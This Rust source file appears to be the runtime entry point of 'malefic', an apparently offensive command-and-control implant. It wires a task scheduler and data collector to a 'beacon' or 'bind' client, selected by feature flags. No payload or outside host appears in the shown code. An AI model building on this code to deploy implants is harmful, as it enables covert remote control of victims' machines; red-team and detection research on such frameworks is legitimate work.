use futures::channel::mpsc;
use futures::try_join;

use malefic_scheduler::collector::Collector;
use malefic_scheduler::Scheduler;
use malefic_stub::channel::MaleficChannel;

pub async fn run(instance_id: [u8; 4]) {
    malefic_common::block_on(8, 32, async move { run_internal(instance_id).await });
}

async fn run_internal(_instance_id: [u8; 4]) {
    let (collector_response_sender, collector_response_receiver) = mpsc::unbounded();

    let mut collector = Collector::new(collector_response_sender);
    let mut scheduler = Scheduler::new(collector.get_data_sender());
    let channel = MaleficChannel {
        data_sender: collector.get_data_sender(),
        request_sender: collector.get_request_sender(),
        response_receiver: collector_response_receiver,
        scheduler_task_sender: scheduler.get_task_sender(),
        scheduler_task_ctrl: scheduler.get_task_ctrl_sender(),
    };

    #[cfg(all(feature = "beacon", not(feature = "bind")))]
    let mut client = match crate::beacon::MaleficBeacon::new(_instance_id, channel) {
        Ok(c) => c,
        Err(_) => return,
    };

    #[cfg(feature = "bind")]
    let mut client = match crate::bind::MaleficBind::new(channel).await {
        Ok(c) => c,
        Err(_e) => {
            malefic_common::debug!("[malefic] Failed to create bind client: {}", _e);
            return;
        }
    };

    let _ = try_join!(scheduler.run(), collector.run(), client.run());
}
